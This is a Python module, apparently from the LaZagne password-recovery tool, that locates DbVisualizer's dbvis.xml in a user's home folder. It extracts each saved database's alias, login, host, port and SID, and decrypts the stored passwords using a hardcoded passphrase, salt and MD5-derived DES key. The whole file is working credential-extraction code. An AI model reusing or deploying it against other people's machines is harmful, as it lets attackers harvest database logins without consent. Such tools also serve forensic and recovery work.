from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.constant import *
import xml.etree.cElementTree as ET
from Crypto.Cipher import DES
from Crypto.Hash import MD5
import binascii
import hashlib
import array
import base64
import re
import os

class Dbvisualizer(ModuleInfo):
	def __init__(self):
		options = {'command': '-d', 'action': 'store_true', 'dest': 'dbvis', 'help': 'dbvisualizer'}
		ModuleInfo.__init__(self, 'dbvis', 'database', options, need_to_be_in_env=False)

		self._salt = self.get_salt()
		self._passphrase = 'qinda'
		self._iteration = 10

	# ---- functions used to decrypt the password ----
	def get_salt(self):
		salt_array = [-114,18,57,-100,7,114,111,90]
		salt = array.array('b', salt_array)
		hexsalt = binascii.hexlify(salt)
		return binascii.unhexlify(hexsalt)

	def get_derived_key(self, password, salt, count):
		key = bytearray(password) + salt

		for i in range(count):
			m = hashlib.md5(key)
			key = m.digest()
		return (key[:8], key[8:])

	def decrypt(self, msg):
		enc_text = base64.b64decode(msg)
		(dk, iv) = self.get_derived_key(self._passphrase, self._salt, self._iteration)
		crypter = DES.new(dk, DES.MODE_CBC, iv)
		text = crypter.decrypt(enc_text)
		return re.sub(r'[\x01-\x08]','',text)

	# ---- end of the functions block ----

	def get_infos(self, path):
		xml_file = os.path.join(path, 'config70/dbvis.xml')

		if os.path.exists(xml_file):
			tree = ET.ElementTree(file=xml_file)
		
		pwdFound = []
		for e in tree.findall('Databases/Database'):
			values = {}
			try:
				values['Name'] = e.find('Alias').text
			except:
				pass
			
			try:
				values['Login'] = e.find('Userid').text
			except:
				pass
			
			try:
				ciphered_password = e.find('Password').text
				password = self.decrypt(ciphered_password)
				values['Password'] = password
				passwordFound = True
			except:
				pass
			
			try:
				values['Driver'] = e.find('UrlVariables//Driver').text.strip()
			except:
				pass
			
			try:
				elem = e.find('UrlVariables')
				for ee in elem.getchildren():
					for ele in ee.getchildren():
						if 'Server' == ele.attrib['UrlVariableName']:
							values['Host'] = str(ele.text)
						if 'Port' == ele.attrib['UrlVariableName']:
							values['Port'] = str(ele.text)
						if 'SID' == ele.attrib['UrlVariableName']:
							values['SID'] = str(ele.text)
			except:
				pass
			
			if values:
				pwdFound.append(values)
		
		return pwdFound

	def get_application_path(self):
		path = os.path.join(constant.profile['HOMEPATH'], '.dbvis')
		if os.path.exists(path):
			return path
		else:
			return False
		

	def run(self, software_name = None):	
		application_path = self.get_application_path()
		if not application_path:
			print_debug('INFO', 'Dbvisualizer not installed.')
		else:
			return self.get_infos(application_path)

